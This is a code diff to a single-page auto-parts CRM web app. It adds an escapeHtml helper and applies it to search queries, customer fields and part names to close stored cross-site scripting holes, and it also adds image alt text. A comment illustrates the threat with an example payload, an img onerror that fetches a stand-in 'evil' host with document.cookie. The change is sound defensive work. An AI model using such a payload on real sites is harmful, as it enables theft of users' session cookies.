@@ -12,9 +12,6 @@
   <meta name="mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <meta name="apple-mobile-web-app-title" content="Zempel Auto">
-  <link rel="icon" type="image/png" sizes="32x32" href="assets/icons/icon-32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="assets/icons/icon-16.png">
-  <link rel="apple-touch-icon" sizes="180x180" href="assets/icons/apple-touch-icon-180.png">
   <link rel="apple-touch-icon" href="assets/favicon-cropped1.PNG">
   <meta name="description" content="Zempel Auto CRM — Auto parts inventory, customer, and sales management.">
   <link rel="stylesheet" href="/assets/styles.css">
@@ -875,7 +872,7 @@
           <img src="assets/z-auto-9.jpeg" alt="Zempel Auto logo" class="brand-logo-overlay" loading="eager"
             decoding="sync" />
         </a>
-        <p class="text-[9px] text-slate-500 font-mono tracking-widest mt-3 pl-px">PARTS COMMAND &nbsp;·&nbsp; CRM v3.0
+        <p class="text-[9px] text-slate-500 font-mono tracking-widest mt-3 pl-px">PARTS COMMAND &nbsp;·&nbsp; CRM v3.0.0
         </p>
       </div>
       <nav class="flex-1 overflow-y-auto px-3 pb-6">
@@ -967,6 +964,20 @@
     };
 
     let windowDB = null;
+
+    // ── SECURITY (2026-09) ──
+    // Escapes user-controllable text before it is interpolated into an
+    // innerHTML template literal. Customer/part/vehicle fields are free text
+    // a user can type, so rendering them unescaped is a stored-XSS vector —
+    // e.g. a customer name of `<img src=x onerror=fetch('//evil/?c='+document.cookie)>`
+    // executes for anyone who opens the Customers view. Apply this to any
+    // DB-derived or user-typed string placed into innerHTML (not to values
+    // already going through textContent, which is inherently safe).
+    function escapeHtml(str) {
+      return String(str ?? '').replace(/[&<>"']/g, (c) => ({
+        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+      }[c]));
+    }
 
     function sanitizeDB(db) {
       if (!db) return;
@@ -1254,7 +1265,7 @@
     <div class="animate-slide-in">
       <div class="flex items-center justify-between mb-4">
         <h2 class="text-xl font-bold text-white">Search Results</h2>
-        <span class="text-sm text-slate-400">${results.length} results for "${query}"</span>
+        <span class="text-sm text-slate-400">${results.length} results for "${escapeHtml(query)}"</span>
       </div>
       <div class="space-y-2">
         ${results.length === 0 ? '<p class="text-slate-400 text-center py-12">No results found</p>' :
@@ -1262,7 +1273,7 @@
             <div class="glass-card rounded-xl p-4 flex items-center justify-between cursor-pointer hover:border-blue-500/30 transition-all" onclick="navigate('${r.view}')">
               <div class="flex items-center gap-3">
                 <span class="badge ${r.type === 'Part' ? 'bg-blue-500/20 text-blue-400' : r.type === 'Customer' ? 'bg-green-500/20 text-green-400' : 'bg-purple-500/20 text-purple-400'}">${r.type}</span>
-                <span class="text-sm text-white">${r.name}</span>
+                <span class="text-sm text-white">${escapeHtml(r.name)}</span>
               </div>
               <i class="ph ph-caret-right text-slate-500"></i>
             </div>
@@ -2015,7 +2026,7 @@
 
       ${part.photoUrl ? `
       <div class="mb-5 rounded-xl overflow-hidden border border-slate-700 bg-slate-800 flex items-center justify-center relative">
-        <img src="${part.photoUrl}" class="max-w-full max-h-[300px] object-contain">
+        <img src="${part.photoUrl}" alt="${escapeHtml(part.name || 'Part')} photo" class="max-w-full max-h-[300px] object-contain">
       </div>
       ` : ''}
 
@@ -2206,7 +2217,7 @@
             </button>
           </div>
           <div id="partPhotoPreviewContainer" class="hidden mt-2 rounded-xl overflow-hidden relative border border-slate-700 aspect-video bg-slate-800 flex items-center justify-center">
-              <img id="partPhotoPreview" src="" class="max-w-full max-h-full object-contain">
+              <img id="partPhotoPreview" src="" alt="Part photo preview" class="max-w-full max-h-full object-contain">
               <button type="button" onclick="clearPartPhoto()" class="absolute top-2 right-2 bg-red-500/80 hover:bg-red-500 text-white rounded-full p-1"><i class="ph-bold ph-x"></i></button>
           </div>
           <input type="hidden" name="photoUrl" id="addPartPhotoUrl" value="">
@@ -2337,7 +2348,7 @@
             </button>
           </div>
           <div id="editPartPhotoPreviewContainer" class="${part.photoUrl ? '' : 'hidden'} mt-2 rounded-xl overflow-hidden relative border border-slate-700 aspect-video bg-slate-800 flex items-center justify-center">
-              <img id="editPartPhotoPreview" src="${part.photoUrl || ''}" class="max-w-full max-h-full object-contain">
+              <img id="editPartPhotoPreview" src="${part.photoUrl || ''}" alt="${escapeHtml(part.name || 'Part')} photo preview" class="max-w-full max-h-full object-contain">
               <button type="button" onclick="clearEditPartPhoto()" class="absolute top-2 right-2 bg-red-500/80 hover:bg-red-500 text-white rounded-full p-1"><i class="ph-bold ph-x"></i></button>
           </div>
           <input type="hidden" name="photoUrl" id="editPartPhotoUrl" value="${part.photoUrl || ''}">
@@ -2489,9 +2500,9 @@
                   ${(cust.name || '?').split(' ').filter(Boolean).map(n => n[0]).join('').substring(0, 2).toUpperCase()}
                 </div>
                 <div class="flex-1 min-w-0">
-                  <h4 class="text-sm font-semibold text-white truncate">${cust.name || 'Unknown Customer'}</h4>
-                  <p class="text-xs text-slate-400">${cust.phone || '—'}</p>
-                  <p class="text-xs text-slate-500 truncate">${cust.email || '—'}</p>
+                  <h4 class="text-sm font-semibold text-white truncate">${escapeHtml(cust.name || 'Unknown Customer')}</h4>
+                  <p class="text-xs text-slate-400">${escapeHtml(cust.phone || '—')}</p>
+                  <p class="text-xs text-slate-500 truncate">${escapeHtml(cust.email || '—')}</p>
                 </div>
               </div>
               <div class="flex items-center justify-between mt-3 pt-3 border-t border-slate-700/50">
@@ -2900,7 +2911,7 @@
           <label class="text-xs text-slate-400 mb-1 block">Customer *</label>
           <select name="customerId" required class="glass-input w-full px-3 py-2.5 rounded-lg text-sm text-white">
             <option value="">Select customer...</option>
-            ${db.customers.map(c => `<option value="${c.id}">${c.name}</option>`).join('')}
+            ${db.customers.map(c => `<option value="${c.id}">${escapeHtml(c.name)}</option>`).join('')}
           </select>
         </div>
         <div class="grid grid-cols-3 gap-3">
@@ -3183,7 +3194,7 @@
             <label class="text-xs text-slate-400 mb-1 block">Customer *</label>
             <select name="customerId" id="estCustomer" required onchange="updateEstimateVehicles()" class="glass-input w-full px-3 py-2.5 rounded-lg text-sm text-white">
               <option value="">Select...</option>
-              ${db.customers.map(c => `<option value="${c.id}">${c.name}</option>`).join('')}
+              ${db.customers.map(c => `<option value="${c.id}">${escapeHtml(c.name)}</option>`).join('')}
             </select>
           </div>
           <div>
